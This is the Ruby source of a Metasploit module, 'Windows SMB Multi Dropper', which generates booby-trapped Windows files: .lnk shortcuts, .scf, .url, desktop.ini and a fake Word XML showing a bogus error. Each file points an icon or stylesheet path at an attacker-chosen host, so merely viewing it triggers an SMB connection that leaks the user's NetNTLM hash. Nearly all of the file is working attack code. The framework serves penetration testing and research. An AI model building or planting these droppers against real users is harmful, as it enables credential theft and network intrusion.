##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows SMB Multi Dropper',
        'Description'   => %q{
          This module dependent on the given filename extension creates either
          a .lnk, .scf, .url, .xml, or desktop.ini file which includes a reference
          to the the specified remote host, causing SMB connections to be initiated
          from any user that views the file.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
            [
              'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy
              'Lnk Creation Code by Mubix',         #Lnk Creation Code written by Mubix
              'asoto-r7'                            #Word XML creation code
            ],
        'Platform'      => [ 'win' ],
        'References'    =>
        [
          ['URL', 'https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018'],
          ['URL', 'https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/'],
          ['URL', 'https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/'],
        ]

      ))
    register_options(
      [
        OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
        OptString.new("FILENAME", [ true, "Filename - supports *.lnk, *.scf, *.url, *.xml, desktop.ini", "word.lnk"]),
      ])
  end

  def run
    if datastore['FILENAME'].chars.last(3).join=="lnk"
        createlnk
    elsif datastore['FILENAME'].chars.last(3).join=="scf"
        createscf
    elsif datastore['FILENAME']=="desktop.ini"
        create_desktopini
    elsif datastore['FILENAME'].chars.last(3).join=="url"
        create_url
    elsif datastore['FILENAME'].chars.last(3).join=="xml"
        create_xml
    else
        fail_with(Failure::BadConfig,"Invalid FILENAME option")
    end
  end

  def createlnk
    #Code below taken from module droplnk.rb written by Mubix
    lnk = ""
    lnk << "\x4c\x00\x00\x00"                  #Header size
    lnk << "\x01\x14\x02\x00\x00\x00\x00\x00"  #Link CLSID
    lnk << "\xc0\x00\x00\x00\x00\x00\x00\x46"
    lnk << "\xdb\x00\x00\x00"                  #Link flags
    lnk << "\x20\x00\x00\x00"                  #File attributes
    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Creation time
    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Access time
    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Write time
    lnk << "\x00\x00\x00\x00"                  #File size
    lnk << "\x00\x00\x00\x00"                  #Icon index
    lnk << "\x01\x00\x00\x00"                  #Show command
    lnk << "\x00\x00"                          #Hotkey
    lnk << "\x00\x00"                          #Reserved
    lnk << "\x00\x00\x00\x00"                  #Reserved
    lnk << "\x00\x00\x00\x00"                  #Reserved
    lnk << "\x7b\x00"                          #IDListSize
    #sIDList
    lnk << "\x14\x00\x1f\x50\xe0\x4f\xd0\x20"
    lnk << "\xea\x3a\x69\x10\xa2\xd8\x08\x00"
    lnk << "\x2b\x30\x30\x9d\x19\x00\x2f"
    lnk << "C:\\"
    lnk << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    lnk << "\x00\x00\x00\x4c\x00\x32\x00\x00\x00\x00\x00\x7d\x3f\x5b\x15\x20"
    lnk << "\x00"
    lnk << "AUTOEXEC.BAT"
    lnk << "\x00\x00\x30\x00\x03\x00\x04\x00\xef\xbe\x7d\x3f\x5b\x15\x7d\x3f"
    lnk << "\x5b\x15\x14\x00\x00\x00"
    lnk << Rex::Text.to_unicode("AUTOEXEC.BAT")
    lnk << "\x00\x00\x1c\x00\x00\x00"
    #sLinkInfo
    lnk << "\x3e\x00\x00\x00\x1c\x00\x00\x00\x01\x00"
    lnk << "\x00\x00\x1c\x00\x00\x00\x2d\x00\x00\x00\x00\x00\x00\x00\x3d\x00"
    lnk << "\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x3e\x77\xbf\xbc\x10\x00"
    lnk << "\x00\x00\x00"
    lnk << "C:\\AUTOEXEC.BAT"
    lnk << "\x00\x00\x0e\x00"
    #RELATIVE_PATH
    lnk << Rex::Text.to_unicode(".\\AUTOEXEC.BAT")
    lnk << "\x03\x00"
    #WORKING_DIR
    lnk << Rex::Text.to_unicode("C:\\")
    #ICON LOCATION
    lnk << "\x1c\x00"
    lnk << Rex::Text.to_unicode("\\\\#{datastore['LHOST']}\\icon.ico")
    lnk << "\x00\x00\x03\x00\x00\xa0\x58\x00\x00\x00\x00\x00\x00\x00"
    lnk << "computer"
    lnk << "\x00\x00\x00\x00\x00\x00\x26\x4e\x06\x19\xf2\xa9\x31\x40\x91\xf0"
    lnk << "\xab\x9f\xb6\xb1\x6c\x84\x22\x03\x57\x01\x5e\x1d\xe1\x11\xb9\x48"
    lnk << "\x08\x00\x27\x6f\xe3\x1f\x26\x4e\x06\x19\xf2\xa9\x31\x40\x91\xf0"
    lnk << "\xab\x9f\xb6\xb1\x6c\x84\x22\x03\x57\x01\x5e\x1d\xe1\x11\xb9\x48"
    lnk << "\x08\x00\x27\x6f\xe3\x1f\x00\x00\x00\x00"

    file_create(lnk)
  end

  def createscf
    scf=""
    scf << "[Shell]\n"
    scf << "Command=2\n"
    scf << "IconFile=\\\\#{datastore['LHOST']}\\test.ico\n"
    scf << "[Taskbar]\n"
    scf << "Command=ToggleDesktop"

    file_create(scf)
  end

  def create_desktopini
    ini=""
    ini << "[.ShellClassInfo]\n"
    ini << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
    ini << "IconIndex=1337"

    file_create(ini)
  end

  def create_url
    url=""
    url << "[InternetShortcut]\n"
    url << "URL=file://#{datastore['LHOST']}/url.html\n"
    url << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"

    file_create(url)
  end

  def create_xml
    xml=""
    xml << "<?xml version='1.0' encoding='utf-8' ?>"
    xml << "<?mso-application progid='Word.Document'?>"
    xml << "<?xml-stylesheet type='text/xsl' href='file://#{datastore['LHOST']}/share/word.xsl'?>"
    xml << "<Text>"
    xml << " FATAL ERROR: The document failed to render properly."
    xml << "</Text>"

    file_create(xml)
  end

end
